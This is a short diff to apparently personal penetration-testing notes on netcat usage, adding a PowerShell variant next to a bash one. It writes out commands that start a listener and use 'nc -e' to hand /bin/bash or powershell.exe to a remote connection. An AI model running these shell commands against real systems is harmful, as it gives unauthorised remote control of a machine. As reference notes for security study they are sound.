@@ -20,8 +20,9 @@ For stabilisation see [[2 Tech-Specifics/OS/Linux/Reverse Shell Stabalisation|Re
 # Usage
 
 - start listener: `nc -lnvp <port>
-- connect to machine: `nc <target-ip> <chosen-port>`
-	- start bind shell running bash: `nc -nv <target-ip> <chosen-port> -e /bin/bash`
+- connect to machine: `nc <target_ip> <port>`
+	- start bind shell running bash: `nc -nv <target_ip> <port> -e /bin/bash`
+	- start bind shall running powershell: `nc <target_ip> <port> -e powershell.exe`
 
 | Option         | Purpose                                         |
 | -------------- | ----------------------------------------------- |
